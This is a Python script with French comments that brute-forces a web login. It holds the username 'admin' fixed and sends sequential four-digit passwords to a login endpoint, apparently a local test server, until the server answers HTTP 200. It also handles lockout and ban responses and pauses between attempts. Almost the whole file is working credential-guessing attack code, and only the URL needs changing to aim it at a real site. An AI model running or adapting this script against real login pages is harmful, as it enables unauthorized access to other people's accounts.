'''VERSION ASYNCHRONE : USERNAME FIXE ET MOT DE PASSE DYNAMIQUE SÉQUENTIEL
Pour les commentaires spécifiques a des variables "de base" voir /spam_V3/sync.py
'''
 
import httpx     
import asyncio
import sys # pour faire joli dans le terminal

CHARGEMENT = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

async def send_request(username: str, password: str) -> int: # renvoie un entier
    url = "http://127.0.0.1:8000/login"
    donnees = {                                                                                  
        "username": username,                                                    
        "password": password                                                           
    }
    '''headers = {                                                                                                             
        "User-Agent": "Mon-Script-Asynchrone-V2",                                                                               
        "Accept": "text/html,application/xhtml+xml"                                                                             
    }  '''   
    
    # Création du client asynchrone httpx
    async with httpx.AsyncClient() as client:
        reponse = await client.post(url, data=donnees) # headers=headers 
        statut = reponse.status_code                                                
        return statut
                                                                         
async def main():
    print('🚀 Démarrage du script...')
    
    # Initialisation des variables AVANT la boucle
    compteur_animation = 0
    tentatives = 0
    
    # LE USERNAME EST CONNU : On le définit une fois ici
    USERNAME_CONNU = "admin"
    
    while True:
        try:
            # Gestion de l'animation graphique sur une seule ligne
            symbole = CHARGEMENT[compteur_animation % len(CHARGEMENT)]
            tentatives += 1
        
            # \r remet le curseur au début de la ligne, évite le saut de ligne
            sys.stdout.write(f"\r{symbole} Recherche en cours... Tentative n°{tentatives}")
            sys.stdout.flush()
            compteur_animation += 1
            
            # --- ZONE DYNAMIQUE SÉQUENTIELLE ---
            # Le nom d'utilisateur ne bouge pas
            username = USERNAME_CONNU 
            
            # Génération d'un mot de passe numérique à 4 chiffres (0001, 0002, 0003...) basé sur la tentative
            password = f"{tentatives:04d}" 
            # -----------------------------------
            
            # Exécution de la requête réseau
            statut = await send_request(username=username, password=password)
            
            # Petite pause réglementaire (évite la saturation)
            await asyncio.sleep(0.1) 
            
            # Analyse et traitement des statuts HTTP reçus
            if statut == 200:      
                sys.stdout.write("\r" + " " * 50 + "\r")  # Efface l'animation courante                                                                    
                print(f"✅ tentatives : {tentatives}")
                print(f"👤 Login : {username}")
                print(f"🔑 MDP   : {password}")
                break # Succès complet : on coupe la boucle et le script s'arrête
              
            elif statut == 404: 
                sys.stdout.write("\r" + " " * 50 + "\r")
                print('❌ Erreur 404 : L\'adresse cible est introuvable.')                                                                         
                break # L'URL est fausse, inutile de continuer à boucler                 
                
            elif statut == 401:                                                   
                pass # Identifiants incorrects : ignoré en silence, l'animation continue au prochain mdp          
                
            elif statut == 403:
                sys.stdout.write("\r" + " " * 50 + "\r")
                print('🔒 Erreur 403 : Accès interdit (IP bloquée / pare-feu)')
                break # Vous êtes banni temporairement, inutile d'insister                                     
                
            else:                                                                                        
                sys.stdout.write("\r" + " " * 50 + "\r")
                print(f"⚠️ Autre code reçu : {statut}")   
                await asyncio.sleep(2) # Pause de sécurité plus longue en cas d'anomalie inconnue
                          
        except Exception as e:
            sys.stdout.write("\r" + " " * 50 + "\r")
            print(f"Erreur réseau détectée : {e}")
            # Grosse pause pour laisser le réseau ou le serveur respirer avant de retenter
            await asyncio.sleep(10)

asyncio.run(main())